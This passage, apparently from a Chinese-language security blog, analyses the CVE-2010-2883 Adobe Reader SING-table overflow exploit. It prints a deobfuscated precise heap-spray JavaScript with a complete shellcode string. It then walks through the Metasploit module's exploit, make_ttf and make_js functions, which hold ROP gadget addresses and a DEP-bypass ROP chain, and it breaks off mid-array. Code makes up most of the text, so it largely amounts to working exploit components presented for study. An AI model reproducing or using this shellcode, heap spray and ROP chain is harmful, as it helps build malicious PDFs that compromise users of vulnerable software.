class="params">(ascsii_str)</span>:</span></span><br><span class="line">    unicode_str = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> ascsii_str:</span><br><span class="line">        unicode_str += c</span><br><span class="line">        unicode_str += chr(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> unicode_str</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_hash</span><span class="params">(name_string)</span>:</span></span><br><span class="line">    name_hash = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> name_string:</span><br><span class="line">        name_hash = circular_shift_right(name_hash,K,bit)</span><br><span class="line">        name_hash += ord(c)</span><br><span class="line">    <span class="keyword">return</span> name_hash</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    dll_name_unicode = ascii2unicode(dll_name)</span><br><span class="line">    dll_name_hash = calc_hash(dll_name_unicode)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"dll_name_hash:"</span> + <span class="string">"&#123;:x&#125;"</span>.format(dll_name_hash).upper()</span><br><span class="line">    func_name_hash = calc_hash(func_name)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"func_name_hash:"</span> + <span class="string">"&#123;:x&#125;"</span>.format(func_name_hash).upper()</span><br><span class="line">    api_hash = dll_name_hash + func_name_hash</span><br><span class="line">    <span class="keyword">if</span> api_hash &gt; <span class="number">0xFFFFFFFF</span>:</span><br><span class="line">        api_hash = api_hash - <span class="number">0x100000000</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"api_hash:"</span> + <span class="string">"&#123;:x&#125;"</span>.format(api_hash).upper()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h3 id="0x42-Heap-Spray"><a href="#0x42-Heap-Spray" class="headerlink" title="0x42 Heap Spray"></a>0x42 Heap Spray</h3><p>&emsp;&emsp;在进行<code>Heap Spray</code>时，我们一般会将EIP控制到<code>0x0C0C0C0C</code>，利用<code>javascript</code>申请大量的<code>堆内存块</code>，并用包含着<code>0x90(nop)</code>和<code>shellcode</code>的内存片覆盖这些内存。通常javascript会<code>从内存低址向高址</code>分配内存，因此申请的内存<code>超过200MB</code>(200MB=200x1024x1024=0x0C800000&gt;0x0C0C0C0C)后，<code>0x0C0C0C0C</code>就会被含有<code>shellcode</code>的内存块覆盖。只要内存片中的<code>0x90</code>能够命中<code>0x0C0C0C0C</code>的位置，通过<code>滑行</code>，就可以执行到<code>shellcode</code>。</p>
<p>&emsp;&emsp;我们可以通过<code>PDFStreamDumper</code>看到内嵌的<code>javascript</code>代码。我们看到的代码是经过<code>混淆</code>的，所以将其复制出，将一些<code>变量名</code>和<code>对象名</code>进行重命名后，得到如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = <span class="built_in">unescape</span>( <span class="string">'%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%u6dba%u42a5%udd5e%ud9c4%u2474%u5df4%uc931%u31b1%uc583%u3104%u0f55%u5503%u4762%ua2b7%u0594%u5b38%u6a64%ubeb0%uaa55%ucba6%u1ac5%u9eac%ud1e9%u0ae0%u977a%u3c2c%u12cb%u730b%u0fcc%u126f%u524e%uf4bc%u9d6f%uf5b1%uc0a8%ua738%u8e61%u58ef%uda06%ud233%uca54%u0733%ued2c%u9612%ub427%u18b4%ucce4%u02fc%ue9e9%ub9b7%u86d9%u6849%u6610%u55e5%u959d%u92f7%u4619%uea82%ufb5a%u2895%u2721%uab13%uac81%u1783%u6030%ud355%ucd3e%ubb11%ud022%ub7f6%u595e%u17f9%u19d7%ub3de%ufabc%ue57f%uac18%uf580%u11c3%u7d25%u46e9%udc54%u9867%u5aea%u9ac5%u64f4%uf379%uefc5%u8416%u25d9%u7a53%u6490%u13f5%ufd7d%u7e44%u2b7e%u878a%udefd%u7c72%uab1d%u3877%u4799%u5105%u684c%u52ba%u0b45%uc15d%ue205%u61f8%ufaaf'</span> );</span><br><span class="line"><span class="keyword">var</span> nop = <span class="built_in">unescape</span>( <span class="string">"%"</span> + <span class="string">"u"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"%u"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> ); <span class="comment">//nop.length=2,unicode字符数</span></span><br><span class="line"><span class="keyword">while</span> (nop.length + <span class="number">20</span> + <span class="number">8</span> &lt; <span class="number">65536</span>) <span class="comment">//2^16=65536,0x10000,nop长度最终为0x20000字节(128KB),这里的(+20+8)感觉没什么作用</span></span><br><span class="line">    nop+=nop;</span><br><span class="line">temp_chip = nop.substring(<span class="number">0</span>, (<span class="number">0x0c0c</span><span class="number">-0x24</span>)/<span class="number">2</span>); <span class="comment">//精准堆喷</span></span><br><span class="line">temp_chip += shellcode;</span><br><span class="line">temp_chip += nop;</span><br><span class="line">memory_chip = temp_chip.substring(<span class="number">0</span>, <span class="number">65536</span>/<span class="number">2</span>);  <span class="comment">//memory_chip长度为0x10000字节(64KB)</span></span><br><span class="line"><span class="keyword">while</span>(memory_chip.length &lt; <span class="number">0x80000</span>)             <span class="comment">//memory_chip长度最终为0x80000*2=0x100000字节(1MB)</span></span><br><span class="line">    memory_chip += memory_chip;</span><br><span class="line">memory_chip_reduce = memory_chip.substring(<span class="number">0</span>, <span class="number">0x80000</span> - (<span class="number">0x1020</span><span class="number">-0x08</span>) / <span class="number">2</span>); <span class="comment">//加快堆喷速度(0x20+0x1000-0x8),对齐大小0x1000,x86使用的页面大小为4K</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> memory = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">for</span> (count = <span class="number">0</span>; count &lt; <span class="number">0x1f0</span>; count++) <span class="comment">//0x1F0=496</span></span><br><span class="line">    memory[count] = memory_chip_reduce + <span class="string">"s"</span>;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;平常看到的<code>Heap Spray</code>代码都是使用<code>%u9090(NOP)</code>进行填充，看到这个漏洞的<code>Heap Spray</code>代码有点蒙逼，然后百度了一下，发现<code>%u0C0C</code>相当于<code>OR AL,0CH</code>，虽然说用到了AL，但是这肯定与后面的<code>shellcode</code>代码无关，所以也就相当于啥也没做。一般对<code>Heap Spray</code>的内存块填充以<code>NOP SLED + ShellCode</code>形式进行<code>填充</code>，NOP SLED在整个内存块中所占<code>比例较大</code>，所以当控制EIP转到<code>0x0C0C0C0C</code>执行时，命中<code>NOP SLED</code>的几率比较大。但是此漏洞使用的堆喷代码进行了<code>精准堆喷</code>,使地址<code>0x0C0C0C0C</code>处的代码就是用于<code>漏洞利用的有效代码</code>。由于<code>Windows</code>系统的<code>分配粒度</code>为<code>64KB</code>,所以分配到的<code>堆块首地址</code>的对齐大小为<code>0x10000</code>,堆块大小为<code>0x100000(1MB)</code>。我们只要让每个内存块中地址为<code>0x....0C0C</code>处的代码为<code>漏洞利用的有效代码</code>,就可以做到<code>精准堆喷</code>。为了<code>加快堆喷</code>的速度,我们可以将<code>1MB内存块</code>中,最后一个<code>0x10000</code>内存片中<code>shellcode后面</code>的数据剪掉,避免<code>无用数据</code>的赋值,就可以加快堆喷的速度。</p>
<p>&emsp;&emsp;从上面的代码可知，我们是用大小为<code>65536B</code>的数据填充<code>1MB</code>的内存块，每块数据的起始地址都是<code>0x....0000</code>,从<code>temp_chip = nop.substring(0, (0x0c0c-0x24)/2);</code>这句可以看出，是为了将<code>shellcode</code>放置在每个数据块(65536B)偏移为<code>0x0C0C-0x24</code>的位置。0x24(36 bytes=32+4)是因为申请到的内存块拥有一些<code>额外的信息</code>，为了精确的计算出偏移，所以要将这部分信息所占的内存减去。所以，当我们控制EIP跳转到<code>0x0C0C0C0C</code>时，可以直接执行<code>shellcode</code>。</p>
<table>
<thead>
<tr>
<th style="text-align:left"></th>
<th style="text-align:left">SIZE</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">header</td>
<td style="text-align:left">32 bytes</td>
<td style="text-align:left">堆块信息头</td>
</tr>
<tr>
<td style="text-align:left">string length</td>
<td style="text-align:left">4 bytes</td>
<td style="text-align:left">字符串长度</td>
</tr>
<tr>
<td style="text-align:left">terminator</td>
<td style="text-align:left">2 bytes</td>
<td style="text-align:left">字符串终止符，两个字节的NULL</td>
</tr>
</tbody>
</table>
<h3 id="0x43-Exploit脚本分析"><a href="#0x43-Exploit脚本分析" class="headerlink" title="0x43 Exploit脚本分析"></a>0x43 Exploit脚本分析</h3><h4 id="1、exploit"><a href="#1、exploit" class="headerlink" title="1、exploit()"></a>1、exploit()</h4><p>&emsp;&emsp;Exploit脚本位置在metasploit-framework/modules/exploits/windows/fileformat,其主函数为exploit,内容如下：</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span></span></span><br><span class="line">    ttf_data = make_ttf() <span class="comment"># 构造ttf字体数据,SING表内容就在其中</span></span><br><span class="line"></span><br><span class="line">    js_data = make_js(payload.encoded) <span class="comment"># 构建Heap Spary js代码,ROP Chain及Payload就包含在里面</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Create the pdf</span></span><br><span class="line">    pdf = make_pdf(ttf_data, js_data) <span class="comment"># 构造pdf文件数据,将前面构造好的ttf字体数据和js代码放入其中</span></span><br><span class="line"></span><br><span class="line">    print_status(<span class="string">"Creating '<span class="subst">#&#123;datastore[<span class="string">'FILENAME'</span>]&#125;</span>' file..."</span>)</span><br><span class="line"></span><br><span class="line">    file_create(pdf) <span class="comment"># 创建pdf文件</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<h4 id="2、make-ttf"><a href="#2、make-ttf" class="headerlink" title="2、make_ttf()"></a>2、make_ttf()</h4><p>&emsp;&emsp;此函数首先打开了一个<code>正常的ttf模板</code>文件,然后构造了<code>SING表</code>数据,将<code>ttf字体</code>文件中的<code>name表</code>数据替换为<code>构造的SING表</code>数据,<code>“name”</code>字符串替换为<code>“SING”</code>。<code>构造的SING表数据</code>包括用于将程序控制流劫持到<code>Heap Spary代码</code>处执行的<code>ROP Chain</code>,以及溢出后、获得程序控制流之前,用于绕过<code>造成程序执行出错</code>的数据。这部分在前面分析<code>此漏洞是怎样触发</code>的时候,介绍过。</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_ttf</span></span></span><br><span class="line">    ttf_data = <span class="string">""</span></span><br><span class="line">    <span class="comment"># 加载正常的ttf字体文件</span></span><br><span class="line">    <span class="comment"># <span class="doctag">NOTE:</span> The 0day used Vera.ttf (785d2fd45984c6548763ae6702d83e20)</span></span><br><span class="line">    path = File.join( Msf::Config.data_directory, <span class="string">"exploits"</span>, <span class="string">"cve-2010-2883.ttf"</span> )</span><br><span class="line">    fd = File.open( path, <span class="string">"rb"</span> )</span><br><span class="line">    ttf_data = fd.read(fd.stat.size)</span><br><span class="line">    fd.close</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造SING表</span></span><br><span class="line">    sing = <span class="string">''</span></span><br><span class="line">    sing &lt;&lt; [</span><br><span class="line">        <span class="number">0</span>, <span class="number">1</span>,   <span class="comment"># tableVersionMajor, tableVersionMinor (0.1)</span></span><br><span class="line">        <span class="number">0xe01</span>,  <span class="comment"># glyphletVersion</span></span><br><span class="line">        <span class="number">0x100</span>,  <span class="comment"># embeddingInfo</span></span><br><span class="line">        <span class="number">0</span>,      <span class="comment"># mainGID</span></span><br><span class="line">        <span class="number">0</span>,      <span class="comment"># unitsPerEm</span></span><br><span class="line">        <span class="number">0</span>,      <span class="comment"># vertAdvance</span></span><br><span class="line">        <span class="number">0x3a00</span>  <span class="comment"># vertOrigin</span></span><br><span class="line">    ].pack(<span class="string">'vvvvvvvv'</span>) <span class="comment"># 把两个字符当作little-endian字节顺序的无符号的short。</span></span><br><span class="line">    <span class="comment"># uniqueName</span></span><br><span class="line">    <span class="comment"># "The uniqueName string must be a string of at most 27 7-bit ASCII characters"</span></span><br><span class="line">    <span class="comment">#sing &lt;&lt; "A" * (0x254 - sing.length)</span></span><br><span class="line">    sing &lt;&lt; rand_text(<span class="number">0x254</span> - sing.length) <span class="comment"># 生成随机文本字符,避免漏洞利用中的坏字符</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0xffffffff gets written here @ 0x7001400 (in BIB.dll)</span></span><br><span class="line">    <span class="comment"># 07001400  f0:ff08  lock dec dword ptr ds:[eax] ; eax=0x4a8a08e2,这句代码将[0x4a8a08e2]变为0xFFFFFFFF</span></span><br><span class="line">    <span class="comment"># 这段代码对eax指向的内存进行了读写,所以eax的值必须是一个可读可写的地址</span></span><br><span class="line">    <span class="comment"># 0x4a8a08e2位于icucnv36的.data段,0x4a8a08e2由this指针(对象(0x0012E608))的值得来(lea eax,dword ptr ds:[ecx+0x1C])</span></span><br><span class="line">    sing[<span class="number">0x140</span>, <span class="number">4</span>] = [<span class="number">0x4a8a08e2</span> - <span class="number">0x1c</span>].pack(<span class="string">'V'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This becomes our new EIP (puts esp to stack buffer),此ROPgadget使esp指向栈上uniqueName缓冲区内</span></span><br><span class="line">    <span class="comment"># ROP1</span></span><br><span class="line">    ret = <span class="number">0x4a80cb38</span> <span class="comment"># add ebp, 0x794 / leave / ret</span></span><br><span class="line">    sing[<span class="number">0x208</span>, <span class="number">4</span>] = [ret].pack(<span class="string">'V'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This becomes the new eip after the first return,此ROPgadget使esp变为Heap Spary中的Payload地址,并跳转到Payload执行</span></span><br><span class="line">    <span class="comment"># ROP2</span></span><br><span class="line">    ret = <span class="number">0x4a82a714</span> <span class="comment"># pop esp / ret</span></span><br><span class="line">    sing[<span class="number">0x18</span>, <span class="number">4</span>] = [ret].pack(<span class="string">'V'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This becomes the new esp after the first return,Heap Spary中的Payload地址,新的esp</span></span><br><span class="line">    esp = <span class="number">0x0c0c0c0c</span></span><br><span class="line">    sing[<span class="number">0x1c</span>, <span class="number">4</span>] = [esp].pack(<span class="string">'V'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Without the following, sub_801ba57 returns 0.</span></span><br><span class="line">    sing[<span class="number">0x24c</span>, <span class="number">4</span>] = [<span class="number">0x6c</span>].pack(<span class="string">'V'</span>)</span><br><span class="line"></span><br><span class="line">    ttf_data[<span class="number">0xec</span>, <span class="number">4</span>] = <span class="string">"SING"</span></span><br><span class="line">    ttf_data[<span class="number">0x11c</span>, sing.length] = sing</span><br><span class="line"></span><br><span class="line">    ttf_data</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<h4 id="3、make-js"><a href="#3、make-js" class="headerlink" title="3、make_js()"></a>3、make_js()</h4><p>&emsp;&emsp;此函数的功能将j<code>avascript的代码</code>转换为<code>字符串</code>,并将javascript的<code>变量名</code>进行<code>混淆</code>。javascript的代码用于<code>堆喷</code>,所以我们应将用于将<code>真正的shellcode</code>复制到<code>可读可写可执行</code>内存段的<code>ROP Chain</code>以及<code>经过编码的Payload</code>编入其中。将<code>真正的shellcode</code>复制到<code>可读可写可执行</code>内存段的<code>ROP Chain</code>的细节前面讲过了,就不说了。其他<code>关键部分</code>都做了注释,<code>函数功能</code>如下：</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_js</span><span class="params">(encoded_payload)</span></span></span><br><span class="line">    <span class="comment"># 使用icucnv36.dll中的代码片段,构建ret2lib的ROP Chain.以此绕过DEP,执行shellcode.</span></span><br><span class="line">    stack_data = [</span><br><span class="line">        <span class="number">0x41414141</span>,   <span class="comment"># unused</span></span><br><span class="line">        <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">        <span class="number">0x4a8a0000</span>,   <span class="comment"># becomes ecx</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a802196</span>,   <span class="comment"># mov [ecx],eax / ret # save whatever eax starts as</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">        <span class="number">0x4a84903c</span>,   <span class="comment"># becomes eax (import for CreateFileA)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># -- call CreateFileA</span></span><br><span class="line">        <span class="number">0x4a80b692</span>,   <span class="comment"># jmp [eax]</span></span><br><span class="line">        <span class="number">0x4a801064</span>,   <span class="comment"># ret</span></span><br><span class="line">        <span class="number">0x4a8522c8</span>,   <span class="comment"># first arg to CreateFileA (lpFileName / pointer to "iso88591")</span></span><br><span class="line">        <span class="number">0x10000000</span>,   <span class="comment"># second arg  - dwDesiredAccess</span></span><br><span class="line">        <span class="number">0x00000000</span>,   <span class="comment"># third arg   - dwShareMode</span></span><br><span class="line">        <span class="number">0x00000000</span>,   <span class="comment"># fourth arg  - lpSecurityAttributes</span></span><br><span class="line">        <span class="number">0x00000002</span>,   <span class="comment"># fifth arg   - dwCreationDisposition</span></span><br><span class="line">        <span class="number">0x00000102</span>,   <span class="comment"># sixth arg   - dwFlagsAndAttributes</span></span><br><span class="line">        <span class="number">0x00000000</span>,   <span class="comment"># seventh arg - hTemplateFile</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">        <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">        <span class="number">0x00000008</span>,   <span class="comment"># becomes ebx - offset to modify</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># This points at a neat-o block of code that ... TBD</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment">#   and [esp+ebx*2],edi</span></span><br><span class="line">        <span class="comment">#   jne check_slash</span></span><br><span class="line">        <span class="comment"># ret_one:</span></span><br><span class="line">        <span class="comment">#   mov al,1</span></span><br><span class="line">        <span class="comment">#   ret</span></span><br><span class="line">        <span class="comment"># check_slash:</span></span><br><span class="line">        <span class="comment">#   cmp al,0x2f</span></span><br><span class="line">        <span class="comment">#   je ret_one</span></span><br><span class="line">        <span class="comment">#   cmp al,0x41</span></span><br><span class="line">        <span class="comment">#   jl check_lower</span></span><br><span class="line">        <span class="comment">#   cmp al,0x5a</span></span><br><span class="line">        <span class="comment">#   jle check_ptr</span></span><br><span class="line">        <span class="comment"># check_lower:</span></span><br><span class="line">        <span class="comment">#   cmp al,0x61</span></span><br><span class="line">        <span class="comment">#   jl ret_zero</span></span><br><span class="line">        <span class="comment">#   cmp al,0x7a</span></span><br><span class="line">        <span class="comment">#   jg ret_zero</span></span><br><span class="line">        <span class="comment">#   cmp [ecx+1],0x3a</span></span><br><span class="line">        <span class="comment">#   je ret_one</span></span><br><span class="line">        <span class="comment"># ret_zero:</span></span><br><span class="line">        <span class="comment">#   xor al,al</span></span><br><span class="line">        <span class="comment">#   ret</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">        <span class="number">0x4a849038</span>,   <span class="comment"># becomes eax (import for CreateFileMappingA)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># -- call CreateFileMappingA</span></span><br><span class="line">        <span class="number">0x4a80b692</span>,   <span class="comment"># jmp [eax]</span></span><br><span class="line">        <span class="number">0x4a801064</span>,   <span class="comment"># ret</span></span><br><span class="line">        <span class="number">0xffffffff</span>,   <span class="comment"># arguments to CreateFileMappingA, hFile</span></span><br><span class="line">        <span class="number">0x00000000</span>,   <span class="comment"># lpAttributes</span></span><br><span class="line">        <span class="number">0x00000040</span>,   <span class="comment"># flProtect</span></span><br><span class="line">        <span class="number">0x00000000</span>,   <span class="comment"># dwMaximumSizeHigh</span></span><br><span class="line">        <span class="number">0x00010000</span>,   <span class="comment"># dwMaximumSizeLow</span></span><br><span class="line">        <span class="number">0x00000000</span>,   <span class="comment"># lpName</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">        <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">        <span class="number">0x00000008</span>,   <span class="comment"># becomes ebx - offset to modify</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">        <span class="number">0x4a849030</span>,   <span class="comment"># becomes eax (import for MapViewOfFile</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># -- call MapViewOfFile</span></span><br><span class="line">        <span class="number">0x4a80b692</span>,   <span class="comment"># jmp [eax]</span></span><br><span class="line">        <span class="number">0x4a801064</span>,   <span class="comment"># ret</span></span><br><span class="line">        <span class="number">0xffffffff</span>,   <span class="comment"># args to MapViewOfFile - hFileMappingObject</span></span><br><span class="line">        <span class="number">0x00000022</span>,   <span class="comment"># dwDesiredAccess</span></span><br><span class="line">        <span class="number">0x00000000</span>,   <span class="comment"># dwFileOffsetHigh</span></span><br><span class="line">        <span 